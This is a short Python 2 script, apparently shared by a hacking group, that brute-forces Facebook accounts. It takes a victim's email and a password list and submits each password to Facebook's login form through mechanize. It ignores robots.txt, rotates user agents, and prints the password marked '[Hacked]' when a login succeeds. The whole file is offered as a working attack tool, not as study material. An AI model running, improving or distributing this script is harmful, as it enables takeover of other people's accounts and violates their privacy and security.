#!/usr/bin/python2
#scripte by : ARSecurityTeam 
#FB_Brout
import sys
import random
import mechanize
import cookielib
import os
import sys


# Set Colors ######

N = '\033[0m'

W = '\033[1;37m'

B = '\033[1;34m'

R = '\033[1;31m'

G = '\033[1;32m'

Y = '\033[1;33m'

C = '\033[1;36m'

##################


# Restart ####################

def restart_program():

   python = sys.executable

   os.execl(python, python, * sys.argv)

   curdir = os.getcwd()

##############################


os.system("clear")



print ("\033[1;31m                ______ _ ")
print ("\033[1;31m                |  ___| | ")
print ("\033[1;31m                | |_  | |__ ")
print ("\033[1;31m                |  _| | '_ \ ")
print ("\033[1;31m                | |   | |_) | ")
print ("\033[1;31m                \_|   |_.__/  ")
                                                              
print ("\033[1;92m       ______                 _ ")
print ("\033[1;92m       | ___ \               | | ")
print ("\033[1;92m       | |_/ /_ __ ___  _   _| |_ ___ ")
print ("\033[1;92m       | ___ \ '__/ _ \| | | | __/ _ \ ")
print ("\033[1;92m       | |_/ / | | (_) | |_| | ||  __/ ")
print ("\033[1;92m       \____/|_|  \___/ \__,_|\__\___| ")
print (" ")
print (" ")
print (" ")

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
email = str(raw_input(" User's Email: \t"))
pwd_file = str(raw_input(" Passlist: \t"))
 
try:
    list = open(pwd_file,'r')
    passwords = list.readlines()
except IOError:
    print('Wrong Wordlist: ')
    sys.exit(0)
 
def start(password):
    try:
        br.addheaders = [('User-agent', random.choice(useragents))]
        br.open('https://www.facebook.com/login.php?login_attempt=1')
        br.select_form(nr=0)
 
        br.form['email'] = email
        br.form['pass'] = password
        br.submit()
 
        log = br.geturl()
        print("\033[1;31m[wrong]:\t" + str(password))
        if log == 'https://www.facebook.com/':
            print ("\n\033[1;91m[Hacked]:\t " + password)
            sys.exit(0)
        else:
            return
    except KeyboardInterrupt:
        sys.exit(1)
 
br = mechanize.Browser()
cj = cookielib.LWPCookieJar()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_cookiejar(cj)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 
for i in range(len(passwords)):
    passwords[i] = passwords[i].strip()
    passwords[i] = passwords[i].replace('\n','')
 
for password in passwords:
    start(password)
